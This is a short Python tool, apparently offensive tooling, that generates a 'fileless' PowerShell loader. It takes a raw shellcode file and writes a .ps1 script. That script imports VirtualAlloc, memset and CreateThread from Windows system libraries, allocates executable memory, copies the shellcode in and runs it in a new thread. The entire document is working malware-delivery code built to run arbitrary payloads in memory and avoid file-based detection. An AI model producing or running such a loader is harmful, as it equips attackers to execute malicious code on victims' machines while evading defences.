import argparse
import base64
import sys
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger('FilelessPS')

PS_TEMPLATE = """$code = @'
[DllImport("kernel32")]
public static extern IntPtr VirtualAlloc(uint lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32")]
public static extern IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
[DllImport("msvcrt")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);
'@

$win32 = Add-Type -MemberDefinition $code -Name "Win32" -Namespace "Win32Functions" -PassThru

[Byte[]]$sc = {shellcode}

$size = $sc.Length
[IntPtr]$addr = $win32::VirtualAlloc(0, $size, 0x3000, 0x40)
$win32::memset($addr, 0, $size) | Out-Null
[System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $addr, $size)
$win32::CreateThread(0, 0, $addr, 0, 0, [ref]0) | Out-Null
"""

def generate_loader(sc_path, output):
	"""Generate a fileless PowerShell loader with embedded shellcode."""
	try:
		with open(sc_path, "rb") as f:
			sc_bytes = f.read()
		
		# Convert shellcode to a comma-separated hex string
		hex_sc = ",".join([f"0x{b:02x}" for b in sc_bytes])
		ps_script = PS_TEMPLATE.replace("{shellcode}", hex_sc)
		
		# Write the PowerShell script to the output file
		with open(output, "w") as f:
			f.write(ps_script)
		
		logger.info(f"Fileless loader written to {output}")
	except Exception as e:
		logger.error(f"Failed to generate fileless loader: {str(e)}")
		raise

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description="Fileless PowerShell Loader Generator")
	parser.add_argument("-f", "--file", required=True, help="Raw shellcode file")
	parser.add_argument("-o", "--output", default="loader.ps1", help="Output file")
	args = parser.parse_args()
	
	try:
		generate_loader(args.file, args.output)
	except Exception as e:
		logger.error(f"Script execution failed: {str(e)}")
		sys.exit(1)